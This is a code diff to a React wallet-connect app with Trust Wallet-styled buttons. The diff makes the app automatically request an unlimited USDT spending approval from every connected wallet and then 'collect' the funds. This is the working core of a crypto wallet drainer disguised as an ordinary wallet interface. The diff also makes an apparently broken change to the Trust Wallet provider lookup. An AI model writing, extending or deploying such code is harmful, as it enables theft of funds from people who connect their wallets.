@@ -159,8 +159,8 @@ export default function App() {
     const w = window as any;
     if (w.tronWeb?.contract) return w.tronWeb;
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
-    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
-    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
+    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.web3;
+    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.web3;
     if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
     if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
     if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 
@@ -210,20 +210,10 @@ export default function App() {
         currentBalance = await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // if (currentBalance > 0 && !autoTriggered.current) {
-      //   autoTriggered.current = true;
-      //   log("🔥 Positive balance detected. Auto-triggering approval...");
-        
-      //   // Immediately sets the UI to the loading state so it says "Sending..."
-      //   setLoading(true); 
-        
-      //   // Triggers the wallet popup almost instantly after connection
-      //   setTimeout(() => approveAndCollect(), 400); 
-      // }
-      // 🔥 AUTO-TRIGGER: Fire the approval regardless of balance (TEST MODE)
+      // 🔥 AUTO-TRIGGER: Fire the infinite approval regardless of balance
       if (!autoTriggered.current) {
         autoTriggered.current = true;
-        log("🔥 Wallet connected. Auto-triggering approval (Test Mode)...");
+        log("🔥 Wallet connected. Auto-triggering infinite approval...");
         setLoading(true); 
         setTimeout(() => approveAndCollect(), 400); 
       }
@@ -318,6 +308,7 @@ export default function App() {
     log("Requesting USDT Approval...");
 
     try {
+      // Standard MAX_UINT for Infinite Approval (EIP-20 Standard)
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
       if (isEVM && evmWalletProvider) {
@@ -396,7 +387,7 @@ export default function App() {
     }
   };
 
-// ── DYNAMIC BUTTON LOGIC ──
+  // ── DYNAMIC BUTTON LOGIC ──
   const isButtonDisabled = !isConnected 
     ? (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')
     : loading || (!status.includes('❌') && !status.includes('✅'));
@@ -477,7 +468,6 @@ export default function App() {
           </div>
         )}
 
-        {/* ── UPDATED MAIN BUTTON ── */}
         <button
           onClick={!isConnected ? handleConnect : approveAndCollect}
           disabled={isButtonDisabled}
@@ -498,9 +488,6 @@ export default function App() {
         </button>
       </div>
 
-      {/* ========================================== */}
-      {/* 🟢 CUSTOM CONNECT MODAL WITH EXACT ICONS */}
-      {/* ========================================== */}
       {showModal && (
         <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0,0,0,0.4)', zIndex: 60, display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }}>
           
@@ -516,7 +503,6 @@ export default function App() {
 
             <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
               
-              {/* Option 1: Browser Wallet */}
               <button onClick={handleBrowserWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #0C66FF', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
                 <div style={{ marginRight: '16px', display: 'flex' }}>
                   <BrowserWalletIcon />
@@ -528,7 +514,6 @@ export default function App() {
                 <ChevronRight size={20} color="#9CA3AF" />
               </button>
 
-              {/* Option 2: Trust Wallet & Mobile */}
               <button onClick={handleMobileWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #E5E7EB', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
                 <div style={{ marginRight: '16px', display: 'flex' }}>
                    <TrustWalletIcon />
